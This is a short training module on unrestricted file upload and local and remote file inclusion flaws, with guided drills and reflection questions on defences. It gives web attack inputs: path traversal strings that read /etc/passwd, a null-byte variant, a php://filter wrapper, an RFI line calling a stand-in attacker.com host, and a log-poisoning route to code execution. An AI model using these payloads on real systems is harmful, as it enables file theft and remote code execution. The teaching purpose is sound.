# File Upload and File Inclusion Vulnerabilities

## 1. Orientation

### What this module covers
This module covers two distinct but related flaws: **Unrestricted File Upload** (putting evil code on server) and **File Inclusion** (making server read evil code).

### Fit in the Learning Path
These are shell-getters. An arbitrary file upload often leads directly to Remote Code Execution (RCE).

### Learning Objectives
By the end of this module, you should understand:
*   **LFI** (Local File Inclusion).
*   **RFI** (Remote File Inclusion).
*   Web Shells (`.php`, `.jsp`).

---

## 2. Core Content

### File Upload
User uploads `avatar.jpg`.
*   **Attack**: Upload `shell.php` but name it `avatar.php`.
*   **If Successful**: Visit `site.com/uploads/avatar.php` -> Code executes.
*   **Bypasses**: `avatar.php.jpg`, `avatar.pHp`, Magic Bytes manipulation.

### File Inclusion (LFI/RFI)
Code: `include($_GET['page'])`
*   **LFI**: `page=../../../../etc/passwd`. (Path Traversal). Reads server files.
*   **RFI**: `page=http://attacker.com/evil.php`. Server downloads and runs your code.

---

## 3. Guided Practice

### Path Traversal Drill
**Target**: `site.com/view?file=report.txt`

**Step 1**: Basic Test.
`file=../../../../etc/passwd` (Linux)
`file=../../../../windows/win.ini` (Windows)

**Step 2**: Null Byte Injection (Legacy PHP).
`file=../../../../etc/passwd%00` (To kill the `.txt` extension the code might add).

**Step 3**: Wrappers.
`file=php://filter/convert.base64-encode/resource=index.php`
*   Reads the source code of `index.php` encoded in Base64 (so it doesn't execute).

---

## 4. Reflection Check

1.  **Storage**: Why is it safer to store uploads on S3 (Cloud) than local disk? (Because S3 cannot execute PHP/ASP code. It just serves files).
2.  **Permissions**: Why should the upload folder have `Execution` disabled? (To prevent shells from running).
3.  **Logs**: LFI often leads to RCE via Log Poisoning. How? (Inject PHP code into the User-Agent, trigger an error (logged to /var/log/apache/error.log), then LFI the log file).

---

## 5. Completion Criteria

This module is complete when:
1.  You can recognize the `../../` pattern.
2.  You understand the danger of dynamic `include()` statements.
3.  You know what a "Web Shell" is.
